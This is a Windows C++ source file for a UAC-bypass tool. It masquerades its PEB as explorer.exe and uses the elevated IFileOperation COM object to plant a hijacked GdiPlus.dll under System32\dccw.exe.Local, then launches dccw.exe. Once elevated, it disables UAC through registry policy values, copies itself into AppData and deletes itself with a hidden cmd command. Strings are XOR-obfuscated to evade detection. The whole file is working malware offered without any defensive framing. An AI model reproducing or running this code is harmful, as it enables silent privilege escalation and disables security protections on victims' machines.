#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <ShlObj.h>
#include <string>
#include <vector>
#include <iostream>
#include <strsafe.h>

#include "XorString.h"
#include "filedata.h"

#pragma warning (disable: 4996)

const int MINIMUM_BUILD_VERSION = 7600;
const DWORD ALWAYS_NOTIFY_UAC_LEVEL = 2;
const DWORD DEFAULT_UAC_LEVEL = 5;


// elevate itself 
BOOL MasqueradePEB() {

	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	// Partial PEB
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(XorStrW(L"ntdll.dll")), XorStr("NtQueryInformationProcess"));
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		GetProcAddress(GetModuleHandle(XorStrW(L"ntdll.dll")), XorStr("RtlEnterCriticalSection"));
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		GetProcAddress(GetModuleHandle(XorStrW(L"ntdll.dll")), XorStr("RtlLeaveCriticalSection"));
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(XorStrW(L"ntdll.dll")), XorStr("RtlInitUnicodeString"));
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	// Let's overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), XorStrW(L"\\explorer.exe"));

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	// Take ownership of PEB
	RtlEnterCriticalSection(peb->FastPebLock);

	// Masquerade ImagePathName and CommandLine 
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Masquerade FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	//Release ownership of PEB
	RtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}

std::vector <std::wstring> getDirectories(LPCWSTR targetedDirectories) {
	WIN32_FIND_DATA ffd;
	std::vector <std::wstring> dirNames;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;
	LPCTSTR fixedDirectory = XorStrW(L"dccw.exe.Local");

	hFind = FindFirstFile(targetedDirectories, &ffd);
	if (INVALID_HANDLE_VALUE == hFind) {
		exit(1);
	}

	do {
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			std::wstring slash(XorStrW(L"\\"));
			std::wstring path = fixedDirectory + slash + ffd.cFileName;
			LPCWSTR finalPath = path.c_str();
			dirNames.push_back(finalPath);
		}
	} while (FindNextFile(hFind, &ffd) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES) {
		exit(1);
	}

	FindClose(hFind);

	return dirNames;
}

std::wstring getBuildNumber() {
	HKEY root = HKEY_LOCAL_MACHINE;
	std::wstring key = XorStrW(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
	std::wstring name = XorStrW(L"CurrentBuild");
	HKEY hKey;
	if (RegOpenKeyEx(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
		//wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
		return std::to_wstring(MINIMUM_BUILD_VERSION);
	}

	DWORD type;
	DWORD cbData;
	if (RegQueryValueEx(hKey, name.c_str(), NULL, &type, NULL, &cbData) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		//wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
		return std::to_wstring(MINIMUM_BUILD_VERSION);
	}

	if (type != REG_SZ) {
		RegCloseKey(hKey);
		//wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
		return std::to_wstring(MINIMUM_BUILD_VERSION);
	}

	std::wstring value(cbData / sizeof(wchar_t), L'\0');
	if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value[0]), &cbData) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		//wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
		return std::to_wstring(MINIMUM_BUILD_VERSION);
	}

	RegCloseKey(hKey);

	size_t firstNull = value.find_first_of(L'\0');
	if (firstNull != std::string::npos)
		value.resize(firstNull);

	return value;
}

BOOL IsProcessElevated() {
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize);

	fIsElevated = elevation.TokenIsElevated;

	if (hToken) {
		CloseHandle(hToken);
		hToken = NULL;
	}

	return fIsElevated;
}

BOOL createDirectories(LPCTSTR targetedDirectories) {
	BOOL success = TRUE;
	LPCTSTR fixedDirectory = XorStrW(L"dccw.exe.Local");
	std::vector <std::wstring> dirNames;
	dirNames = getDirectories(targetedDirectories);

	if (!CreateDirectory(fixedDirectory, NULL)) {
		success = FALSE;
	}

	for (int i = 0; i < dirNames.size(); i++) {
		if (!CreateDirectoryW(dirNames.at(i).c_str(), NULL)) {
			SetFileAttributesW(dirNames.at(i).c_str(), FILE_ATTRIBUTE_HIDDEN);
			success = FALSE;
		}
	}

	return success;
}

BOOL removeFilesAndDirectories(LPCWSTR targetedDirectories) {
	BOOL success = TRUE;


	std::vector <std::wstring> dirNames;
	dirNames = getDirectories(targetedDirectories);
	for (int i = 0; i < dirNames.size(); i++) {
		std::wstring filename(XorStrW(L"\\GdiPlus.dll"));
		std::wstring path = dirNames.at(i) + filename;
		LPCWSTR finalPath = path.c_str();
		if (!DeleteFile(finalPath)) {
			success = FALSE;
		}
	}

	for (int i = 0; i < dirNames.size(); i++) {
		if (!RemoveDirectory(dirNames.at(i).c_str())) {
			success = FALSE;
		}
	}

	if (!RemoveDirectory(XorStrW(L"dccw.exe.Local"))) {
		success = FALSE;
	}

	return success;
}

BOOL IFileOperationDelete(LPCWSTR destPath, std::wstring buildVersion) {
	IFileOperation* fileOperation = NULL;

	std::wstring directoryName(XorStrW(L"\\dccw.exe.Local"));
	std::wstring path = destPath + directoryName;

	BIND_OPTS3 bo;
	SHELLEXECUTEINFOW shexec;

	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr)) {
		memset(&shexec, 0, sizeof(shexec));
		memset(&bo, 0, sizeof(bo));
		bo.cbStruct = sizeof(bo);
		bo.dwClassContext = CLSCTX_LOCAL_SERVER;
		hr = CoGetObject(XorStrW(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"), &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
		if (SUCCEEDED(hr)) {
			if (std::stoi(buildVersion) > 14997) {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION);
			}
			else {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOF_SILENT |
					FOFX_SHOWELEVATIONPROMPT |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION |
					FOF_NOERRORUI);
			}
			if (SUCCEEDED(hr)) {
				IShellItem* which = NULL;
				hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&which));
				if (SUCCEEDED(hr)) {
					hr = fileOperation->DeleteItem(which, NULL);
					if (NULL != which) {
						which->Release();
					}
				}
				if (SUCCEEDED(hr)) {
					hr = fileOperation->PerformOperations();
				}
			}
			fileOperation->Release();
		}
		CoUninitialize();
	}

	return TRUE;
}

BOOL IFileOperationCopy(LPCWSTR destPath, std::wstring buildVersion) {
	IFileOperation* fileOperation = NULL;
	WCHAR dllPath[1024];

	LPCWSTR dllName = XorStrW(L"dccw.exe.Local");

	GetModuleFileName(NULL, dllPath, 1024);
	std::wstring path(dllPath);
	const size_t last = path.rfind('\\');
	if (std::wstring::npos != last) {
		path = path.substr(0, last + 1);
	}
	path += dllName;

	// First Masquerade our Process as Explorer.exe 
	if (!MasqueradePEB()) {
		return FALSE;
	}

	BIND_OPTS3 bo;
	SHELLEXECUTEINFOW shexec;

	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

	if (SUCCEEDED(hr)) {
		memset(&shexec, 0, sizeof(shexec));
		memset(&bo, 0, sizeof(bo));
		bo.cbStruct = sizeof(bo);
		bo.dwClassContext = CLSCTX_LOCAL_SERVER;
		hr = CoGetObject(XorStrW(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"), &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
		if (SUCCEEDED(hr)) {
			if (std::stoi(buildVersion) > 14997) {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION);
			}
			else {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOF_SILENT |
					FOFX_SHOWELEVATIONPROMPT |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION |
					FOF_NOERRORUI);
			}
			if (SUCCEEDED(hr)) {
				IShellItem* from = NULL, * to = NULL;
				hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
				if (SUCCEEDED(hr)) {
					if (destPath)
						hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
					if (SUCCEEDED(hr)) {
						hr = fileOperation->CopyItem(from, to, dllName, NULL);
						if (NULL != to) {
							to->Release();
						}
					}
					from->Release();
				}
				if (SUCCEEDED(hr)) {
					hr = fileOperation->PerformOperations();
				}
			}
			fileOperation->Release();
		}
		CoUninitialize();
	}

	return TRUE;
}

void SelfRemove() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintfW(szCmd, 2 * MAX_PATH, L"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"", szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR cmdLine, int nCmdShow) {

	if (IsProcessElevated() == TRUE) {
		//MessageBoxA(0, XorStr("itz admin lol"), XorStr("asd"), MB_OK);

		HKEY hKey;
		LONG lnRes = RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
			L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
			0, KEY_ALL_ACCESS, &hKey);

		if (ERROR_SUCCESS == lnRes) {

			const wchar_t* valueName[] = {
				L"ConsentPromptBehaviorAdmin",
				L"ConsentPromptBehaviorUser",
				L"EnableLUA"
			};
			const size_t nValueName = sizeof(valueName) / sizeof(void*);

			DWORD value = 0x00000000;
			for (int i = 0; i < nValueName; i++) {
				lnRes = RegSetValueExW(hKey,
					valueName[i],
					0, REG_DWORD, (const BYTE*)&value,
					sizeof(value));
			}
		}

		RegCloseKey(hKey);

		SelfRemove();

		exit(0);

	}
	else {
		//MessageBoxA(0, XorStr("itz non admin"), XorStr("asd"), MB_OK);

		std::string appdata = getenv(XorStr("AppData"));
		//MessageBoxA(0, appdata.c_str(), XorStr("asd"), MB_OK);
		std::string fileName = XorStr("\\Bypass.exe");
		std::string destDir = appdata + fileName;

		char currentName[260];
		GetModuleFileNameA(GetModuleHandle(0), currentName, 260);
		CopyFileA(currentName, destDir.c_str(), FALSE);

		
		WIN32_FIND_DATA FindFileData;
		HANDLE hFind;
		LPCWSTR folderName;
		LPCWSTR targetedDirectories = XorStrW(L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*");
		LPCWSTR destPath;
		LPWSTR version = CharLowerW(NULL);

		destPath = XorStrW(L"C:\\Windows\\System32");
		folderName = XorStrW(L"C:\\Windows\\System32\\dccw.exe.Local");

		if (!createDirectories(targetedDirectories)) {
			//
			//MessageBoxA(0, XorStr("failed to create dir"), XorStr("asd"), MB_OK);
		}

		std::vector<std::wstring>dirNames;
		dirNames = getDirectories(targetedDirectories);

		for (int i = 0; i < dirNames.size(); i++) {
			std::wstring filename(XorStrW(L"\\GdiPlus.dll"));
			std::wstring path = dirNames.at(i) + filename;

			LPCWSTR finalPath = path.c_str();

			DWORD wb;
			HANDLE hFile = CreateFileW(
				finalPath, GENERIC_WRITE, 0, 0,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

			WriteFile(hFile, fileData, sizeof(fileData), &wb, NULL);
			CloseHandle(hFile);
		}


		std::wstring buildVersion = getBuildNumber();
		if (!IFileOperationCopy(destPath, buildVersion)) {
			removeFilesAndDirectories(targetedDirectories);
		}

		hFind = FindFirstFile(folderName, &FindFileData);
		if (hFind == INVALID_HANDLE_VALUE) {
			removeFilesAndDirectories(targetedDirectories);
		}
		else {
			FindClose(hFind);

			if ((int)ShellExecuteW(NULL, NULL, XorStrW(L"C:\\Windows\\System32\\dccw.exe"), NULL, NULL, SW_SHOW) > 32) {
				IFileOperationDelete(destPath, buildVersion);
				removeFilesAndDirectories(targetedDirectories);
				// success = TRUE;
			}
			else {
				IFileOperationDelete(destPath, buildVersion);
				removeFilesAndDirectories(targetedDirectories);
			}
		}

		SelfRemove();

		exit(0);
	}
}